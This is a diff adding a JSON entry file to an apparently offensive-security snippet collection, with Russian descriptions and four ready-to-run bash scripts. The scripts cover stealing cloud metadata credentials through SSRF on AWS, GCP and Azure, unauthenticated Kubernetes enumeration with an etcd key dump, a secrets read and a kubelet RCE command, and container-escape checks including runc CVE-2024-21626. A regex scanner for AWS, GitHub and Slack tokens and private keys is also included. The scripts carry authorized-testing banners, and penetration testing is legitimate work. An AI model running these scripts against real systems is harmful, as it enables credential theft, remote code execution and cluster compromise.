@@ -1,0 +1,87 @@
+{
+  "category": "Cloud / Containers / K8s",
+  "group": "modern",
+  "catOrder": 61,
+  "entries": [
+    {
+      "title": "Cloud IMDS SSRF probe (AWS v2 / GCP / Azure)",
+      "lang": "bash",
+      "tags": [
+        "cloud",
+        "ssrf",
+        "imds",
+        "aws",
+        "gcp",
+        "azure",
+        "creds"
+      ],
+      "rating": "must",
+      "deps": "curl",
+      "placeholders": "нет",
+      "source": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html",
+      "license": "GPL-3.0 (оригинал)",
+      "badges": [
+        "oob"
+      ],
+      "body": "Проба **облачного metadata-сервиса (IMDS)** через SSRF: тянет креды/токены из AWS (IMDSv2 с PUT-токеном), GCP и Azure. Запускай прямо на скомпрометированном хосте/контейнере или подставляй URL в найденный SSRF.\n\n> AWS IMDSv2 требует сначала **PUT-запрос за токеном** (`X-aws-ec2-metadata-token-ttl-seconds`), потом GET с этим токеном. GCP и Azure требуют спец-заголовок (`Metadata-Flavor: Google` / `Metadata: true`). Без заголовков ответа не будет, это не «нет уязвимости».\n\ndeps: `curl`. placeholders: нет (фиксированные metadata-IP). 169.254.169.254 - стандартный IMDS-адрес.\n\n```bash\n#!/usr/bin/env bash\n# imds_ssrf_probe.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nset -u\nIMDS=\"169.254.169.254\"\nGCP=\"metadata.google.internal\"\nC=\"curl -s --max-time 5\"\n\necho \"=== AWS (IMDSv2: token then creds) ===\"\nTOK=$($C -X PUT \"http://$IMDS/latest/api/token\" \\\n      -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\nif [ -n \"$TOK\" ]; then\n  echo \"[+] got IMDSv2 token\"\n  ROLE=$($C -H \"X-aws-ec2-metadata-token: $TOK\" \\\n        \"http://$IMDS/latest/meta-data/iam/security-credentials/\")\n  echo \"    role: ${ROLE:-<none>}\"\n  if [ -n \"$ROLE\" ]; then\n    $C -H \"X-aws-ec2-metadata-token: $TOK\" \\\n      \"http://$IMDS/latest/meta-data/iam/security-credentials/$ROLE\"\n    echo\n  fi\nelse\n  # fallback: IMDSv1 (без токена) - если включён, это уже находка\n  echo \"[i] no v2 token, trying IMDSv1\"\n  $C \"http://$IMDS/latest/meta-data/iam/security-credentials/\"; echo\nfi\n\necho \"=== GCP (Metadata-Flavor: Google) ===\"\n$C -H \"Metadata-Flavor: Google\" \\\n  \"http://$GCP/computeMetadata/v1/instance/service-accounts/default/token\"; echo\n\necho \"=== Azure (Metadata: true) ===\"\n$C -H \"Metadata: true\" \\\n  \"http://$IMDS/metadata/instance?api-version=2021-02-01\"; echo\n$C -H \"Metadata: true\" \\\n  \"http://$IMDS/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"; echo\n\necho \"[=] любой непустой блок выше = доступ к metadata-кредам\"\n```\n\nЗапуск:\n```bash\nbash imds_ssrf_probe.sh\n# через SSRF: curl \"http://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/\"\n```"
+    },
+    {
+      "title": "Kubernetes unauth enumeration (kubelet/etcd/apiserver)",
+      "lang": "bash",
+      "tags": [
+        "k8s",
+        "kubelet",
+        "etcd",
+        "apiserver",
+        "rce"
+      ],
+      "rating": "must",
+      "deps": "curl",
+      "placeholders": "{{TARGET}}",
+      "source": "https://github.com/inguardians/peirates",
+      "license": "GPL-3.0 (оригинал)",
+      "badges": [
+        "destructive"
+      ],
+      "body": "Энумерация **неаутентифицированных Kubernetes-сервисов**: kubelet read-only (10255) и API (10250), etcd (2379), apiserver (6443) с anonymous-доступом. Если kubelet принимает `AlwaysAllow`, `/run` на 10250 даёт **RCE в любом поде**.\n\n> Порты: kubelet **10250** (authenticated API, но при AlwaysAllow открыт) и **10255** (read-only, часто без auth), etcd **2379**, apiserver **6443/8080**. На AlwaysAllow-kubelet `POST /run/<ns>/<pod>/<container>` исполняет команду = RCE.\n\ndeps: `curl`. placeholders: `{{TARGET}}` (IP ноды/кластера).\n\n```bash\n#!/usr/bin/env bash\n# k8s_unauth_enum.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nset -u\nT=\"${1:?usage: k8s_unauth_enum.sh <target-ip>}\"\nC=\"curl -s -k --max-time 6\"\n\necho \"=== kubelet read-only API :10255 ===\"\n$C \"https://$T:10255/pods\" -o /dev/null -w \"  /pods (http) -> %{http_code}\\n\" 2>/dev/null\n$C \"http://$T:10255/pods\" | head -c 300; echo\n\necho \"=== kubelet API :10250 (AlwaysAllow check) ===\"\ncode=$($C \"https://$T:10250/pods\" -o /dev/null -w \"%{http_code}\")\necho \"  GET /pods -> $code   (200 = anonymous AlwaysAllow, RCE-prone)\"\nif [ \"$code\" = \"200\" ]; then\n  echo \"  [!] try RCE: curl -k -X POST \\\\\"\n  echo \"        'https://$T:10250/run/<namespace>/<pod>/<container>' -d 'cmd=id'\"\nfi\n\necho \"=== etcd :2379 (unauth key dump) ===\"\n$C \"http://$T:2379/version\"; echo\n$C \"https://$T:2379/v2/keys/?recursive=true\" | head -c 300; echo\n\necho \"=== apiserver :6443 / insecure :8080 ===\"\n$C \"https://$T:6443/api?timeout=5s\" -o /dev/null -w \"  :6443/api -> %{http_code}\\n\"\n$C \"https://$T:6443/api/v1/namespaces/default/secrets\" | head -c 200; echo\n$C \"http://$T:8080/api/v1/pods\" -o /dev/null -w \"  :8080 insecure -> %{http_code}\\n\"\n\necho \"[=] 200/данные на любом эндпоинте без токена = misconfig\"\n```\n\nЗапуск:\n```bash\nbash k8s_unauth_enum.sh 10.0.0.5\n```"
+    },
+    {
+      "title": "Container escape check (cgroup-aware, runc CVE-2024-21626)",
+      "lang": "bash",
+      "tags": [
+        "container",
+        "escape",
+        "docker",
+        "cgroup",
+        "runc",
+        "cve-2024-21626"
+      ],
+      "rating": "must",
+      "deps": "coreutils, capsh, runc (опц.)",
+      "placeholders": "нет",
+      "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-21626",
+      "license": "GPL-3.0 (оригинал)",
+      "badges": [
+        "root"
+      ],
+      "body": "Чек-лист **побега из контейнера**: privileged, проброс `docker.sock`, опасные capability (CAP_SYS_ADMIN), host-mounts, release_agent-трюк и уязвимый runc. Запускать ВНУТРИ контейнера.\n\n> КРИТИЧНО: классический **release_agent escape работает только на cgroup v1**. На cgroup v2 (дефолт Ubuntu 22.04+/Debian 11+/RHEL 9) он мёртв - скрипт детектит версию cgroup и помечает приём **N/A на v2**. release_agent дополнительно требует **root в контейнере + CAP_SYS_ADMIN**. runc **CVE-2024-21626** (fd-leak): affected **<= 1.1.11**, fix в **1.1.12**.\n\ndeps: stdlib coreutils. placeholders: нет. badge: root (часть проверок информативнее от root).\n\n```bash\n#!/usr/bin/env bash\n# container_escape_check.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nset -u\nhit() { printf \"  [\\033[31m!\\033[0m] %s\\n\" \"$1\"; }\nok()  { printf \"  [ ] %s\\n\" \"$1\"; }\n\necho \"=== am I in a container? ===\"\ngrep -qaE 'docker|kubepods|containerd|lxc' /proc/1/cgroup 2>/dev/null && \\\n  ok \"cgroup hints at container\" || ok \"no obvious container cgroup\"\n[ -f /.dockerenv ] && hit \"/.dockerenv present\"\n\necho \"=== cgroup version (decides release_agent path) ===\"\nif [ -f /sys/fs/cgroup/cgroup.controllers ]; then\n  CGV=2; ok \"cgroup v2 -> release_agent escape: N/A\"\nelse\n  CGV=1; ok \"cgroup v1 -> release_agent escape: applicable\"\nfi\n\necho \"=== privileged / capabilities ===\"\nCAP=$(grep CapEff /proc/self/status | awk '{print $2}')\nok \"CapEff=$CAP\"\n# 0x...a80425fb / full 0x3fffffffff => богатый набор. CAP_SYS_ADMIN bit 21.\ncaps=$(capsh --decode=0x\"$CAP\" 2>/dev/null)\necho \"$caps\" | grep -qi cap_sys_admin && hit \"CAP_SYS_ADMIN present (escape-enabling)\"\n[ \"$CAP\" = \"0000003fffffffff\" ] && hit \"FULL capabilities -> likely --privileged\"\n\necho \"=== docker / container socket exposed ===\"\nfor s in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock; do\n  [ -S \"$s\" ] && hit \"socket mounted: $s  (curl --unix-socket $s http://x/containers/json)\"\ndone\n\necho \"=== sensitive host mounts ===\"\nmount 2>/dev/null | grep -E ' / |/etc|/root|/var/lib|host' | grep -iv overlay | head -5\ngrep -qE '/host|/rootfs' /proc/mounts && hit \"host filesystem appears mounted\"\n\necho \"=== release_agent escape pre-reqs (cgroup v1 only) ===\"\nif [ \"$CGV\" = \"1\" ]; then\n  if echo \"$caps\" | grep -qi cap_sys_admin; then\n    hit \"cgroup v1 + CAP_SYS_ADMIN -> release_agent escape feasible (needs root-in-ctr)\"\n  else\n    ok \"cgroup v1 but no CAP_SYS_ADMIN -> not feasible\"\n  fi\nelse\n  ok \"cgroup v2 -> skip release_agent\"\nfi\n\necho \"=== runc version (CVE-2024-21626 fd-leak) ===\"\nRV=$(runc --version 2>/dev/null | awk '/runc version/{print $3}')\nif [ -n \"$RV\" ]; then\n  ok \"runc $RV\"\n  case \"$RV\" in\n    1.1.12|1.1.1[3-9]|1.[2-9]*|[2-9]*) ok \"runc >= 1.1.12 (patched)\";;\n    *) hit \"runc $RV <= 1.1.11 -> CVE-2024-21626 (working-dir fd leak escape)\";;\n  esac\nelse\n  ok \"runc not callable from container (normal)\"\nfi\n\necho \"[=] любой [!] = вектор побега, проверяй вручную\"\n```\n\nЗапуск:\n```bash\nbash container_escape_check.sh        # внутри контейнера, лучше от root\n```"
+    },
+    {
+      "title": "CI / repo secrets grep (AKIA / AIza / xox / ghp_ / .tfstate)",
+      "lang": "bash",
+      "tags": [
+        "secrets",
+        "ci",
+        "aws",
+        "github",
+        "terraform"
+      ],
+      "rating": "nice",
+      "deps": "grep, find",
+      "placeholders": "{{PATH}}",
+      "source": "https://github.com/trufflesecurity/trufflehog",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Греп **секретов и кредов** по дереву каталога/репозитория: ключи AWS (AKIA/ASIA), Google API (AIza), Slack-токены (xox), GitHub PAT (ghp_/github_pat_), приватные ключи и **plaintext `.tfstate`** (Terraform state часто хранит пароли в открытом виде). Для CI-артефактов, дампов, исходников.\n\n> Это grep по паттернам, не валидация живости. Найденный ключ проверяй секцией secrets_validate (файл 64). `.tfstate` смотри целиком: там бывают `password`, `secret`, RDS-креды.\n\ndeps: `grep`. placeholders: `{{PATH}}` (корень для поиска).\n\n```bash\n#!/usr/bin/env bash\n# ci_secrets_grep.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nset -u\nROOT=\"${1:-.}\"\necho \"[*] scanning $ROOT\"\n\n# ключи в одну строку: pattern|label\nPATTERNS='\nAKIA[0-9A-Z]{16}|AWS access key (long-term)\nASIA[0-9A-Z]{16}|AWS access key (temporary STS)\nAIza[0-9A-Za-z_\\-]{35}|Google API key\nxox[baprs]-[0-9A-Za-z-]{10,}|Slack token\nghp_[0-9A-Za-z]{36}|GitHub PAT (classic)\ngithub_pat_[0-9A-Za-z_]{60,}|GitHub PAT (fine-grained)\ngh[opsu]_[0-9A-Za-z]{36}|GitHub token\n-----BEGIN [A-Z ]*PRIVATE KEY-----|Private key block\neyJ[A-Za-z0-9_\\-]{10,}\\.[A-Za-z0-9_\\-]{10,}\\.|JWT\n'\nGREP_OPTS=\"-rEn --binary-files=without-match -I\"\n# исключаем мусор\nEX=\"--exclude-dir=.git --exclude-dir=node_modules --exclude-dir=vendor\"\n\necho \"$PATTERNS\" | while IFS='|' read -r pat label; do\n  [ -z \"$pat\" ] && continue\n  out=$(grep $GREP_OPTS $EX -e \"$pat\" \"$ROOT\" 2>/dev/null | head -8)\n  if [ -n \"$out\" ]; then\n    printf \"\\n=== %s ===\\n%s\\n\" \"$label\" \"$out\"\n  fi\ndone\n\necho\necho \"=== plaintext terraform state (.tfstate) ===\"\nfind \"$ROOT\" -name '*.tfstate' 2>/dev/null | while read -r f; do\n  echo \"  [!] $f\"\n  grep -aEn '\"(password|secret|access_key|secret_key|token)\"' \"$f\" 2>/dev/null | head -5\ndone\n\necho\necho \"[=] совпадения выше -> валидируй ключи (secrets_validate)\"\n```\n\nЗапуск:\n```bash\nbash ci_secrets_grep.sh /path/to/repo\nbash ci_secrets_grep.sh ./ci-artifacts\n```"
+    }
+  ]
+}
